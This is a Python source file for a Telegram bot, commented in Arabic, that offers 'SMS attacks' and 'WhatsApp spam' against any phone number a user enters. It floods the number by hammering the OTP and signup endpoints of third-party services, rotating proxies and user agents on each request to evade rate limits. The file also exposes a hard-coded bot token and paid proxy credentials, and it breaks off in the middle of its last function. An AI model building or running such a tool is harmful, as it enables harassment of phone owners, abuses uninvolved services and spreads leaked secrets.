import requests
import json
import random
import time
import threading
import socket
import subprocess
import sys
import os
from datetime import datetime
import telebot
from telebot import types

# تهيئة البوت
TOKEN = "8519159321:AAFG4WKyeK1BPXCskMVf5PfvVw1bfZdCuc8"
bot = telebot.TeleBot(TOKEN)

# قناة الاشتراك الإجباري
CHANNEL_USERNAME = "@MsForextrading9"

# إعدادات الألوان
RESET_COLOR = "\033[0m"
YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
BLUE = "\033[1;34m"

# قوائم البروكسيات ووكلاء المستخدم
proxies = [
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"socks4": "socks4://37.59.213.49:56887"},
    {"socks4": "socks4://200.46.30.210:4153"},
    
    # البروكسيات الجديدة من proxy-seller
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10000"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10001"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10002"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10003"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10004"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10005"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10006"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10007"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10008"},
    {"http": "http://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10009"},
    
    # إصدارات HTTPS للبروكسيات الجديدة
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10000"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10001"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10002"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10003"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10004"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10005"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10006"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10007"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10008"},
    {"https": "https://57e46e092d7106a2:WqNCTaVe@res.proxy-seller.com:10009"}
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; U; Android 8.1.0) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
]

# المتغيرات العالمية
user_sessions = {}
active_workers = {}
worker_performance = {}
current_master = None
BOT_STATUS = "running"

class NetworkMonitor:
    """مراقب أداء الشبكة والأنظمة"""
    
    @staticmethod
    def get_system_info():
        """الحصول على معلومات النظام"""
        try:
            # استخدام أوامر النظام للحصول على معلومات بديلة
            import platform
            system_info = {
                'cpu': 0,
                'memory_used': 0,
                'disk_used': 0,
                'memory_total': 0,
                'disk_total': 0
            }
            
            # محاولة الحصول على معلومات النظام باستخدام أوامر النظام
            try:
                # للحصول على استخدام الذاكرة (Linux/Mac)
                if platform.system() != "Windows":
                    import subprocess
                    result = subprocess.run(['free', '-m'], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.split('\n')
                        if len(lines) > 1:
                            mem_info = lines[1].split()
                            if len(mem_info) >= 3:
                                total_mem = int(mem_info[1])
                                used_mem = int(mem_info[2])
                                system_info['memory_used'] = (used_mem / total_mem) * 100
                                system_info['memory_total'] = total_mem // 1024  # GB
            except:
                pass
                
            return system_info
        except:
            return {'cpu': 0, 'memory_used': 0, 'disk_used': 0, 'memory_total': 0, 'disk_total': 0}
    
    @staticmethod
    def test_speed():
        """اختبار سرعة الإنترنت"""
        try:
            # استخدام طريقة بديلة لاختبار السرعة
            # يمكن استخدام requests لقياس وقت الاستجابة بدلاً من speedtest
            start_time = time.time()
            try:
                response = requests.get('https://www.google.com', timeout=10)
                ping = (time.time() - start_time) * 1000  # ملي ثانية
            except:
                ping = 999
            
            # قيم تقديرية للتحميل والرفع
            return {
                'download': 10.0,  # Mbps تقديري
                'upload': 5.0,     # Mbps تقديري  
                'ping': round(ping, 2)
            }
        except:
            return {'download': 0, 'upload': 0, 'ping': 999}
    
    @staticmethod
    def calculate_performance_score():
        """حساب درجة الأداء الكلية"""
        system_info = NetworkMonitor.get_system_info()
        speed_info = NetworkMonitor.test_speed()
        
        # حساب الدرجة (كلما كانت أقل أفضل)
        cpu_score = system_info['cpu'] * 0.3
        memory_score = system_info['memory_used'] * 0.2
        speed_score = (100 - min(speed_info['download'], 100)) * 0.5
        
        total_score = cpu_score + memory_score + speed_score
        return total_score

class AutoMasterManager:
    """مدير التشغيل التلقائي الرئيسي"""
    
    def __init__(self):
        self.current_master = None
        self.worker_nodes = {}
        self.performance_threshold = 120  # الحد الأدنى للأداء
    
    def evaluate_nodes(self):
        """تقييم جميع العقد المتاحة"""
        print(f"{CYAN}🔍 جاري تقييم العقد المتاحة...{RESET_COLOR}")
        
        # تقييم العقدة الحالية
        current_score = NetworkMonitor.calculate_performance_score()
        self.worker_nodes['current'] = current_score
        
        print(f"{YELLOW}📊 أداء العقدة الحالية: {current_score:.2f}{RESET_COLOR}")
        
        return 'current'
    
    def select_best_node(self):
        """اختيار أفضل عقدة للأداء"""
        best_node = None
        best_score = float('inf')
        
        for node_id, score in self.worker_nodes.items():
            if score < best_score and score < self.performance_threshold:
                best_score = score
                best_node = node_id
        
        return best_node
    
    def start_auto_master(self):
        """بدء التشغيل التلقائي"""
        global current_master
        
        print(f"{GREEN}🚀 بدء التشغيل التلقائي الذكي...{RESET_COLOR}")
        
        # اكتشاف أفضل عقدة
        self.evaluate_nodes()
        best_node = self.select_best_node()
        
        if best_node:
            self.current_master = best_node
            current_master = best_node
            
            system_info = NetworkMonitor.get_system_info()
            speed_info = NetworkMonitor.test_speed()
            
            print(f"{GREEN}✅ تم اختيار العقدة الحالية كسيرفر رئيسي{RESET_COLOR}")
            print(f"{CYAN}📊 معلومات النظام:{RESET_COLOR}")
            print(f"   🖥️  CPU: {system_info['cpu']}%")
            print(f"   💾 RAM: {system_info['memory_used']}%")
            print(f"   📡 Download: {speed_info['download']} Mbps")
            print(f"   📤 Upload: {speed_info['upload']} Mbps")
            print(f"   🏓 Ping: {speed_info['ping']} ms")
            
            return True
        else:
            print(f"{RED}❌ لا توجد عقدة مناسبة للتشغيل{RESET_COLOR}")
            return False
    
    def monitor_and_switch(self):
        """مراقبة الأداء والتبديل التلقائي"""
        while BOT_STATUS == "running":
            try:
                time.sleep(60)
                
                if self.current_master == 'current':
                    current_score = NetworkMonitor.calculate_performance_score()
                    
                    if current_score > self.performance_threshold:
                        print(f"{YELLOW}⚠️  أداء العقدة الحالية منخفض: {current_score:.2f}{RESET_COLOR}")
                        print(f"{CYAN}🔍 البحث عن عقدة بديلة...{RESET_COLOR}")
                        
                        self.evaluate_nodes()
                        new_master = self.select_best_node()
                        
                        if new_master and new_master != self.current_master:
                            print(f"{GREEN}🔄 الانتقال إلى عقدة جديدة...{RESET_COLOR}")
                            self.current_master = new_master
                            current_master = new_master
            except Exception as e:
                print(f"{RED}❌ خطأ في المراقبة: {e}{RESET_COLOR}")

def check_subscription(chat_id):
    """التحقق من اشتراك المستخدم في القناة"""
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, chat_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def send_sms_attack(chat_id, number, sms_count):
    """دالة لإرسال هجمات SMS في خيط منفصل"""
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{number}"})
    
    success_count = 0
    failure_count = 0
    start_time = datetime.now()
    
    if chat_id != "terminal":
        bot.send_message(chat_id, f"🚀 بدء هجوم SMS على الرقم: {number}\n📱 عدد الرسائل: {sms_count}")
    else:
        print(f"{GREEN}🚀 بدء الإرسال إلى الرقم: {number}{RESET_COLOR}")
        print(f"{YELLOW}📱 عدد الرسائل: {sms_count}{RESET_COLOR}")
        print(f"{CYAN}⏳ جاري الإرسال...{RESET_COLOR}")
    
    for i in range(int(sms_count)):
        if chat_id != "terminal" and not user_sessions.get(chat_id, {}).get('active', True):
            break
            
        proxy = random.choice(proxies)  
        user_agent = random.choice(user_agents)
            
        headers = {
            'User-Agent': user_agent,
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'app_version': "10.10.10",
            'device_token': "",
            'appversion': "10.10.10",
            'channel': "mobileapp",
            'access-token': "",
            'platform': "android",
            'accept-language': "ar",
        }

        try:
            response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
            if response.status_code == 200:
                success_count += 1
                # إخفاء رسائل SUCCESS في التيرمنال
                if chat_id != "terminal":
                    print(f"{GREEN}✅ [{current_master}] SUCCESS{RESET_COLOR}")
            else:
                failure_count += 1
                # إخفاء رسائل FAILED في التيرمنال
                if chat_id != "terminal":
                    print(f"{RED}❌ [{current_master}] Request failed: Status {response.status_code}{RESET_COLOR}")
        except Exception as e:
            failure_count += 1
            # إخفاء رسائل الأخطاء في التيرمنال
            if chat_id != "terminal":
                print(f"{RED}❌ [{current_master}] Request failed: {e}{RESET_COLOR}")

        # تحديث التقدم كل 10 رسائل (فقط في التيرمنال)
        if (i + 1) % 10 == 0:
            if chat_id != "terminal":
                progress = f"📊 التقدم: {i+1}/{sms_count}\n✅ ناجح: {success_count}\n❌ فاشل: {failure_count}"
                bot.send_message(chat_id, progress)
            else:
                # في التيرمنال نعرض التقدم فقط بدون التفاصيل
                print(f"{YELLOW}📊 التقدم: {i+1}/{sms_count}{RESET_COLOR}")

        time.sleep(0.0005)

    # إرسال النتائج النهائية
    end_time = datetime.now()
    duration = end_time - start_time
    
    result_message = f"""
🎯 اكتمل الإرسال!

📊 النتائج النهائية:
├ الرقم المستهدف: {number}
├ إجمالي الطلبات: {sms_count}
├ ✅ الرسائل الناجحة: {success_count}
├ ❌ الرسائل الفاشلة: {failure_count}
├ ⏰ المدة: {duration}
└ 📅 وقت الانتهاء: {end_time.strftime('%Y-%m-%d %H:%M:%S')}

📡 عدد البروكسيات المستخدمة: {len(proxies)}

bot by : @m_n_et
    """
    
    if chat_id != "terminal":
        bot.send_message(chat_id, result_message)
    else:
        print(f"{CYAN}{result_message}{RESET_COLOR}")
    
    # تنظيف الجلسة
    if chat_id in user_sessions:
        del user_sessions[chat_id]

def send_whatsapp_spam(chat_id, number, spam_count):
    """دالة لإرسال هجمات واتساب لجميع الدول في خيط منفصل"""
    
    success_count = 0
    failure_count = 0
    start_time = datetime.now()
    
    if chat_id != "terminal":
        bot.send_message(chat_id, f"🚀 بدء هجوم واتساب على الرقم: {number}\n📱 عدد الرسائل: {spam_count}")
    else:
        print(f"{GREEN}🚀 بدء إسبام واتساب على الرقم: {number}{RESET_COLOR}")
        print(f"{YELLOW}📱 عدد الرسائل: {spam_count}{RESET_COLOR}")
        print(f"{CYAN}⏳ جاري الإرسال...{RESET_COLOR}")
    
    for i in range(int(spam_count)):
        if chat_id != "terminal" and not user_sessions.get(chat_id, {}).get('active', True):
            break
            
        proxy = random.choice(proxies)  
        user_agent = random.choice(user_agents)
            
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'access-control-allow-origin': '*',
            'content-type': 'application/json',
            'origin': 'https://abwaab.com',
            'platform': 'web',
            'priority': 'u=1, i',
            'referer': 'https://abwaab.com/',
            'sec-ch-ua': '"Not;A=Brand";v="99", "Microsoft Edge";v="139", "Chromium";v="139"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
            'x-trace-id': 'guest_user:4a673fb4-cd37-476b-bff6-4056f9d7f5c8',
        }

        # تنظيف الرقم وإضافة + إذا لم تكن موجودة
        clean_number = number.strip()
        if not clean_number.startswith('+'):
            clean_number = '+' + clean_number

        json_data = {
            'language': 'ar',
            'password': 'Aasf5ft',
            'country': '',
            'phone': clean_number,  # استخدام الرقم مع +
            'platform': 'web',
            'data': {'Language': 'ar',},
            'channel': 'whatsapp',
        }

        try:
            response = requests.post('https://gw.abgateway.com/student/whatsapp/signup', headers=headers, json=json_data, proxies=proxy, timeout=10)
            if response.status_code == 200:
                success_count += 1
                if chat_id != "terminal":
                    print(f"{GREEN}✅ [{current_master}] واتساب SUCCESS - {i+1}{RESET_COLOR}")
                else:
                    print(f"{GREEN}✅ تم اسبام واتساب رقم: {i+1} | الرقم: {clean_number}{RESET_COLOR}")
            else:
                failure_count += 1
                if chat_id != "terminal":
                    print(f"{RED}❌ [{current_master}] واتساب Request failed: Status {response.status_code}{RESET_COLOR}")
                else:
                    print(f"{RED}❌ فشل اسبام واتساب رقم: {i+1} | Status: {response.status_code}{RESET_COLOR}")
        except Exception as e:
            failure_count += 1
            if chat_id != "terminal":
                print(f"{RED}❌ [{current_master}] واتساب Request failed: {e}{RESET_COLOR}")
            else:
                print(f"{RED}❌ خطأ في اسبام واتساب رقم: {i+1} | Error: {e}{RESET_COLOR}")

        # تحديث التقدم كل 5 رسائل (فقط في التيرمنال)
        if (i + 1) % 5 == 0:
            if chat_id != "terminal":
                progress = f"📊 التقدم: {i+1}/{spam_count}\n✅ ناجح: {success_count}\n❌ فاشل: {failure_count}"
                bot.send_message(chat_id, progress)
            else:
                print(f"{YELLOW}📊 التقدم: {i+1}/{spam_count}{RESET_COLOR}")

        time.sleep(1)  # تأخير 1 ثانية بين الطلبات

    # إرسال النتائج النهائية
    end_time = datetime.now()
    duration = end_time - start_time
    
    result_message = f"""
🎯 اكتمل إسبام واتساب!

📊 النتائج النهائية:
├ الرقم المستهدف: {number}
├ الرقم المرسل: {clean_number}
├ إجمالي الطلبات: {spam_count}
├ ✅ الرسائل الناجحة: {success_count}
├ ❌ الرسائل الفاشلة: {failure_count}
├ ⏰ المدة: {duration}
└ 📅 وقت الانتهاء: {end_time.strftime('%Y-%m-%d %H:%M:%S')}

📡 عدد البروكسيات المستخدمة: {len(proxies)}

ملاحظة: الرقم يرسل بشكل دولي مع +

bot by : @m_n_et
    """
    
    if chat_id != "terminal":
        bot.send_message(chat_id, result_message)
    else:
        print(f"{CYAN}{result_message}{RESET_COLOR}")
    
    # تنظيف الجلسة
    if chat_id in user_sessions:
        del user_sessions[chat_id]

# ========== الواجهة التلقائية في التيرمنال ==========
def start_terminal_interface():
    """تشغيل الواجهة التلقائية في التيرمنال"""
    print(f"{GREEN}" + "="*60 + f"{RESET_COLOR}")
    print(f"{CYAN}🚀 بوت إرسال الرسائل - الإصدار 3.0{RESET_COLOR}")
    print(f"{YELLOW}⚡️ البوت يعمل تلقائياً - أدخل الرقم لبدء الإرسال{RESET_COLOR}")
    print(f"{GREEN}📡 عدد البروكسيات المتاحة: {len(proxies)}{RESET_COLOR}")
    print(f"{GREEN}" + "="*60 + f"{RESET_COLOR}")
    
    while True:
        try:
            # اختيار نوع الهجوم
            print(f"\n{CYAN}🎯 اختر نوع الهجوم:{RESET_COLOR}")
            print(f"{YELLOW}1. هجوم SMS (جميع الدول){RESET_COLOR}")
            print(f"{YELLOW}2. هجوم واتساب (جميع الدول){RESET_COLOR}")
            attack_type = input("➤ ").strip()
            
            if attack_type not in ['1', '2']:
                print(f"{RED}❌ اختيار غير صحيح! الرجاء اختيار 1 أو 2.{RESET_COLOR}")
                continue
            
            # طلب الرقم مباشرة
            if attack_type == '1':
                print(f"\n{CYAN}📱 أدخل الرقم المستهدف (بدون +){RESET_COLOR}")
                print(f"{YELLOW}مثال: 501234567 أو 966501234567{RESET_COLOR}")
            else:
                print(f"\n{CYAN}📱 أدخل الرقم المستهدف لواتساب{RESET_COLOR}")
                print(f"{YELLOW}مثال: +20123456789 أو 20123456789{RESET_COLOR}")
                print(f"{YELLOW}سيتم إضافة + تلقائياً إذا لم تكن موجودة{RESET_COLOR}")
            
            number = input("➤ ").strip()
            
            # التحقق من الرقم
            if not number.replace('+', '').isdigit() or len(number.replace('+', '')) < 10:
                print(f"{RED}❌ رقم غير صحيح! الرجاء إدخال رقم صالح.{RESET_COLOR}")
                continue
            
            # طلب عدد الرسائل
            if attack_type == '1':
                print(f"\n{CYAN}🔢 كم رسالة SMS تريد إرسال؟{RESET_COLOR}")
                print(f"{YELLOW}يمكنك إرسال من 1 إلى 10000 رسالة{RESET_COLOR}")
            else:
                print(f"\n{CYAN}🔢 كم رسالة واتساب تريد إرسال؟{RESET_COLOR}")
                print(f"{YELLOW}يمكنك إرسال من 1 إلى 1000 رسالة{RESET_COLOR}")
            
            count = input("➤ ").strip()
            
            # التحقق من العدد
            if not count.isdigit() or int(count) <= 0:
                print(f"{RED}❌ عدد غير صحيح! الرجاء إدخال رقم أكبر من الصفر.{RESET_COLOR}")
                continue
            
            # تأكيد العملية
            print(f"\n{YELLOW}⚠️  تأكيد العملية:{RESET_COLOR}")
            attack_name = "SMS" if attack_type == '1' else "واتساب"
            
            # تنظيف الرقم للعرض
            display_number = number
            if attack_type == '2' and not number.startswith('+'):
                display_number = '+' + number
                
            print(f"{CYAN}├ نوع الهجوم: {attack_name}{RESET_COLOR}")
            print(f"{CYAN}├ الرقم: {display_number}{RESET_COLOR}")
            print(f"{CYAN}├ عدد الرسائل: {count}{RESET_COLOR}")
            print(f"{CYAN}├ عدد البروكسيات: {len(proxies)}{RESET_COLOR}")
            
            if attack_type == '1':
                print(f"{CYAN}└ المدة المتوقعة: {int(count) * 0.0005:.1f} ثانية{RESET_COLOR}")
            else:
                print(f"{CYAN}└ المدة المتوقعة: {int(count) * 1:.1f} ثانية{RESET_COLOR}")
            
            print(f"\n{YELLOW}هل تريد بدء الإرسال؟ (نعم/لا){RESET_COLOR}")
            confirm = input("➤ ").strip().lower()
            
            if confirm in ['نعم', 'yes', 'y', 'yep', '']:
                # بدء الإرسال في thread منفصل
                print(f"{GREEN}🚀 بدء الإرسال...{RESET_COLOR}")
                if attack_type == '1':
                    thread = threading.Thread(target=send_sms_attack, args=("terminal", number, count))
                else:
                    thread = threading.Thread(target=send_whatsapp_spam, args=("terminal", number, count))
                thread.start()
                thread.join()  # انتظار انتهاء الإرسال
            else:
                print(f"{YELLOW}❎ تم إلغاء العملية{RESET_COLOR}")
            
            # سؤال إذا كان يريد إرسال مرة أخرى
            print(f"\n{CYAN}هل تريد إرسال إلى رقم آخر؟ (نعم/لا){RESET_COLOR}")
            again = input("➤ ").strip().lower()
            
            if again not in ['نعم', 'yes', 'y', 'yep', '']:
                print(f"\n{GREEN}👋 شكراً لاستخدامك البوت!{RESET_COLOR}")
                print(f"{YELLOW}🚪 جاري الخروج...{RESET_COLOR}")
                break
                
        except KeyboardInterrupt:
            print(f"\n{RED}🛑 تم إيقاف البوت{RESET_COLOR}")
            break
        except Exception as e:
            print(f"{RED}❌ حدث خطأ غير متوقع: {e}{RESET_COLOR}")
            continue

# ========== دوال بوت التلجرام ==========
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """معالج أمر البدء"""
    chat_id = message.chat.id
    
    # التحقق من الاشتراك
    if not check_subscription(chat_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton("📢 قناة البوت", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")
        check_button = types.InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")
        markup.add(channel_button, check_button)
        
        bot.send_message(
            chat_id,
            f"⚠️ **يجب الاشتراك في القناة أولاً**\n\n"
            f"📢 {CHANNEL_USERNAME}\n\n"
            "اشترك ثم اضغط على زر التحقق",
            reply_markup=markup
        )
        return
    
    welcome_text = f"""
🚀 أهلاً بك في بوت Spam SMS الذكي! 🚀

📱 هذا البوت مخصص لإرسال رسائل SMS جماعية وواتساب

⚡️ الميزات الذكية:
├ 🔍 اكتشاف تلقائي لأفضل سيرفر
├ 🖥️  تبديل ذاتي عند انخفاض الأداء  
├ 📊 مراقبة مستمرة للأداء
├ 🔄 توزيع الحمل تلقائياً
├ 📨 إرسال SMS لجميع الدول
└ 💬 إرسال واتساب لجميع الدول

🖥️ السيرفر النشط: {current_master}
📡 عدد البروكسيات: {len(proxies)}

⚡️ الأوامر المتاحة:
/start - عرض هذه الرسالة
/attack - بدء هجوم SMS جديد
/whatsapp - بدء هجوم واتساب (جميع الدول)
/stop - إيقاف الهجوم الحالي
/status - حالة النظام والأداء
/help - عرض المساعدة

bot by : @m_n_et
    """
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 بدء الهجوم SMS')
    btn_whatsapp = types.KeyboardButton('💬 سبام واتساب')
    btn_status = types.KeyboardButton('📊 حالة النظام')
    btn_help = types.KeyboardButton('📖 المساعدة')
    btn_stop = types.KeyboardButton('🛑 إيقاف الهجوم')
    markup.add(btn_attack, btn_whatsapp)
    markup.add(btn_status, btn_help, btn_stop)
    
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['status'])
def system_status(message):
    """عرض حالة النظام والأداء"""
    chat_id = message.chat.id
    
    system_info = NetworkMonitor.get_system_info()
    speed_info = NetworkMonitor.test_speed()
    performance_score = NetworkMonitor.calculate_performance_score()
    
    status_text = f"""
📊 *حالة النظام والأداء*

🖥️ *معلومات النظام:*
├ المعالج: {system_info['cpu']}%
├ الذاكرة: {system_info['memory_used']}% ({system_info['memory_total']}GB)
├ التخزين: {system_info['disk_used']}% ({system_info['disk_total']}GB)

🎯 *معلومات التشغيل:*
├ السيرفر النشط: {current_master}
├ درجة الأداء: {performance_score:.2f}
├ الهجمات النشطة: {len(user_sessions)}
├ عدد البروكسيات: {len(proxies)}
└ حالة البوت: {BOT_STATUS}

bot by : @m_n_et
    """
    
    bot.send_message(chat_id, status_text)

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_subscription_callback(call):
    """معالج التحقق من الاشتراك"""
    chat_id = call.message.chat.id
    
    if check_subscription(chat_id):
        bot.delete_message(chat_id, call.message.message_id)
        send_welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك بعد! اشترك ثم حاول مرة أخرى.")

@bot.message_handler(commands=['help'])
def send_help(message):
    """معالج أمر المساعدة"""
    chat_id = message.chat.id
    
    if not check_subscription(chat_id):
        send_welcome(message)
        return
    
    help_text = f"""
📖 دليل استخدام البوت الذكي:

🎯 أنواع الهجمات المتاحة:
1. هجوم SMS - لجميع الدول
2. هجوم واتساب - لجميع الدول

⚡️ طريقة الاستخدام:
1. استخدم /attack أو زر "بدء الهجوم SMS" لهجوم SMS
2. استخدم /whatsapp أو زر "سبام واتساب" لهجوم واتساب
3. أدخل الرقم المستهدف
4. أدخل عدد الرسائل المراد إرسالها
5. البوت سيتولى الباقي تلقائياً

📱 ملاحظات هامة للواتساب:
- الرقم يجب أن يكون دولياً مع +
- مثال: +20123456789 أو +966501234567
- إذا أدخلت الرقم بدون + سيتم إضافتها تلقائياً

🛡️ نظام البروكسيات:
- عدد البروكسيات المتاحة: {len(proxies)}
- يتم استخدام بروكسيات عشوائية لكل طلب
- يحسن من سرعة وحماية الإرسال

⚡️ الميزات الذكية:
- 🔍 الاكتشاف التلقائي لأفضل سيرفر
- 📊 المراقبة المستمرة للأداء
- 🔄 التبديل التلقائي بين السيرفرات
- 🖥️ توزيع الحمل على multiple nodes

⚠️ ملاحظات:
- يمكن إيقاف الهجوم بأي وقت باستخدام /stop
- البوت يستخدم بروكسيات عشوائية للحماية

🎯 أوامر إضافية:
/status - عرض حالة النظام والأداء
/whatsapp - بدء هجوم واتساب لجميع الدول
    """
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def start_attack(message):
    """بدء هجوم SMS جديد"""
    chat_id = message.chat.id
    
    if not check_subscription(chat_id):
        send_welcome(message)
        return
    
    if chat_id in user_sessions:
        bot.send_message(chat_id, "⚠️ لديك هجوم نشط بالفعل! استخدم /stop لإيقافه أولاً.")
        return
    
    msg = bot.send_message(chat_id, "📱 الرجاء إدخال الرقم المستهدف (بدون +):\n\nمثال: 0123456789")
    bot.register_next_step_handler(msg, process_number_sms)

@bot.message_handler(commands=['whatsapp'])
def start_whatsapp_attack(message):
    """بدء هجوم واتساب لجميع الدول"""
    chat_id = message.chat.id
    
    if not check_subscription(chat_id):
        send_welcome(message)
        return
    
    if chat_id in user_sessions:
        bot.send_message(chat_id, "⚠️ لديك هجوم نشط بالفعل! استخدم /stop لإيقافه أولاً.")
        return
    
    msg = bot.send_message(chat_id, "📱 الرجاء إدخال الرقم المستهدف لواتساب:\n\nمثال: +20123456789 أو 20123456789\nسيتم إضافة + تلقائياً")
    bot.register_next_step_handler(msg, process_number_whatsapp)

@bot.message_handler(func=lambda message: message.text == '🚀 بدء الهجوم SMS')
def start_attack_button(message):
    start_attack(message)

@bot.message_handler(func=lambda message: message.text == '💬 سبام واتساب')
def whatsapp_attack_button(message):
    start_whatsapp_attack(message)

@bot.message_handler(func=lambda message: message.text == '📊 حالة النظام')
def status_button(message):
    system_status(message)

@bot.message_handler(func=lambda message: message.text == '📖 المساعدة')
def help_button(message):
    send_help(message)

@bot.message_handler(func=lambda message: message.text == '🛑 إيقاف الهجوم')
def stop_attack_button(message):
    stop_attack(message)

def process_number_sms(message):
    chat_id = message.chat.id
    number = message.text.strip()
    
    if not number.isdigit() or len(number) < 10:
        bot.send_message(chat_id, "❌ رقم غير صحيح! الرجاء إدخال رقم صالح (أرقام فقط).")
        return
    
    user_sessions[chat_id] = {'number': number, 'active': True, 'type': 'sms'}
    
    msg = bot.send_message(chat_id, "🔢 كم رسالة SMS تريد إرسال؟")
    bot.register_next_step_handler(msg, process_sms_count)

def process_number_whatsapp(message):
    chat_id = message.chat.id
    number = message.text.strip()
    
    # التحقق من الرقم مع السماح بوجود +
    clean_number = number.replace('+', '')
    if not clean_number.isdigit() or len(clean_number) < 10:
        bot.send_message(chat_id, "❌ رقم غير صحيح! الرجاء إدخال رقم صالح.")
        return
    
    user_sessions[chat_id] = {'number': number, 'active': True, 'type': 'whatsapp'}
    
    msg = bot.send_message(chat_id, "🔢 كم رسالة واتساب تريد إرسال؟")
    bot.register_next_step_handler(msg, process_whatsapp_count)

def process_sms_count(message):
    chat_id = message.chat.id
    sms_count = message.text.strip()
    
    if not sms_count.isdigit() or int(sms_count) <= 0:
        bot.send_message(chat_id, "❌ عدد غير صحيح! الرجاء إدخال رقم أكبر من الصفر.")
        return
    
    user_data = user_sessions.get(chat_id, {})
    number = user_data.get('number', '')
    
    if not number:
        bot.send_message(chat_id, "❌ حدث خطأ! الرجاء البدء من جديد باستخدام /attack")
        return
    
    bot.send_message(chat_id, "⚡️ جاري بدء هجوم SMS...\n🖥️ السيرفر النشط: " + str(current_master))
    
    thread = threading.Thread(target=send_sms_attack, args=(chat_id, number, sms_count))
    thread.start()

def process_whatsapp_count(message):
    chat_id = message.chat.id
    whatsapp_count = message.text.strip()
    
    if not whatsapp_count.isdigit() or int(whatsapp_count) <= 0:
        bot.send_message(chat_id, "❌ عدد غير صحيح! الرجاء إدخال رقم أكبر من الصفر.")
        return
    
    user_data = user_sessions.get(chat_id, {})
    number = user_data.get('number', '')
    
    if not number:
        bot.send_message(chat_id, "❌ حدث خطأ! الرجاء البدء من جديد باستخدام /whatsapp")
        return
    
    bot.send_message(chat_id, "⚡️ جاري بدء هجوم واتساب...\n🖥️ السيرفر النشط: " + str(current_master))
    
